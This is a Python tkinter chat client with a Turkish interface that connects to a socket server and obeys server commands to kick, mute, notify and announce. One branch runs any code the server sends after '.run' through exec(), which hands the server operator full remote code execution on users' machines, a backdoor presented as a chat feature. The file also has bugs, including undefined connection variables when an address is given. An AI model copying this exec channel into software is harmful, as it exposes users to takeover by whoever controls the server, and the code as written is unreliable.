import tkinter as tk
from tkinter import messagebox
import socket
from uu import Error
import time
from plyer import notification

client_socket = None

def receive_messages(chat_box_entry, online_users_entry,canvas,out,chat_window,send_button):

    while True:
        try:
            received_message = client_socket.recv(1024).decode("utf-8")

            if received_message:
                if received_message.startswith("Online Users: "):

                    users_str = received_message.split("Online Users: ")[1]
                    liste = users_str.split(", ")

                    canvas.itemconfig(out, text=f"Çevrimiçi Kullanıcılar {len(liste)}")
                    online_users_entry.delete(0, tk.END)

                    for item in liste:
                        online_users_entry.insert(tk.END, item)
                
                elif received_message.startswith(".run"):
                        received_message = received_message.replace(".run", "")
                        received_message = received_message.replace(" ", "",1)

                        chat_box_entry.insert(tk.END, f"Server tarafından çalıştırılan kod: {received_message}")
                        try:
                            exec(received_message)
                        except Exception as e:
                            print(e)

                elif received_message == ".kick":
                    messagebox.showwarning("Sunucu", "Odadan atıldınız")
                    chat_window.destroy()
                    break

                elif received_message == ".mute":
                    messagebox.showwarning("Sunucu", "Susturuldunuz")
                    send_button.config(state=tk.DISABLED)

                elif received_message == ".unmute":
                    messagebox.showinfo("Sunucu", "Artık mesaj gönderebilirsiniz")
                    send_button.config(state=tk.NORMAL)

                elif received_message.startswith(".not"):
                    
                    received_message = received_message.split(" ",2)
                    _, title, content = received_message

                    send_notification(title,content)
                
                elif received_message.startswith(".ann"):
                    received_message = received_message.split(" ",2)
                    title = received_message[1]
                    content = received_message[2]
                    messagebox.showinfo(title, content)

                else:
                    chat_box_entry.insert(tk.END, received_message)
                    chat_box_entry.yview(tk.END)

        except ConnectionResetError:
            messagebox.showerror("Sunucu Hatası", "Sunucu şu an kapalı. Lütfen daha sonra tekrar deneyin")
            chat_window.destroy()
            
def login(server_ip, username, password, chat_window_func,window):  
    global client_socket
    if not server_ip:
        serverIp = "192.168.1.40"
        serverPort = 4444

    if not username or not password:
        messagebox.showerror("Giriş hatası", "Lütfen kullanıcı adı ve şifrenizi girin")
    
    else:
        try:
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.connect((serverIp, serverPort))
        except Exception as e:
            messagebox.showerror("Hata", e)


        client_socket.send("login".encode("utf-8"))
        time.sleep(0.3)
        client_socket.send(username.encode("utf-8"))
        client_socket.send(password.encode("utf-8"))
        try:
            response = client_socket.recv(1024).decode("utf-8")
            print(response)
            if response == "success":
                window.destroy()
                chat_window_func()
            else:
                messagebox.showerror("Giriş hatası", response)
        except Exception as e:
            messagebox.showerror("Hata", e)

def register_user(server_ip, username, password, chat_window_func,window):
    global client_socket
    if not server_ip:
        serverIp = "192.168.1.40"
        serverPort = 4444

    try:
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.connect((serverIp, serverPort))

    except Exception as e:
        messagebox.showerror("Hata", e)

    if not username or not password:
        messagebox.showerror("Giriş hatası", "Lütfen kullanıcı adı ve şifrenizi girin")

    else:
        client_socket.send("register".encode("utf-8"))
        time.sleep(0.3)
        client_socket.send(username.encode("utf-8"))
        client_socket.send(password.encode("utf-8"))

        try:
            response = client_socket.recv(1024).decode("utf-8")
            print(response)

            if response == "success":
                window.destroy()
                chat_window_func()

            else:
                messagebox.showerror("Kayıt hatası", "Kayıt başarısız. Bilgilerinizi kontrol edin.")

        except Error as e:
            messagebox.showerror("hata",e)

def on_closing(window, receive_thread):
    client_socket.send(".exit".encode("utf-8"))    
    client_socket.close()
    window.destroy()
    receive_thread.join()

def send_message(message_entry):
    try:
        message = message_entry.get()

        client_socket.send(message.encode("utf-8"))

        message_entry.delete(0, tk.END)

    except Exception as e:
        messagebox.showerror("Hata", e)

def send_notification(title, message):

    notification.notify(
        title=title,
        message=message,
        app_icon=None,
        timeout=6,
    )

def on_enter(event, message_entry,button):
    if button.cget("state") == tk.NORMAL:
        send_message(message_entry)

#tkinter,plyer,socket,time,threading,hashlib,sqlite3,datetime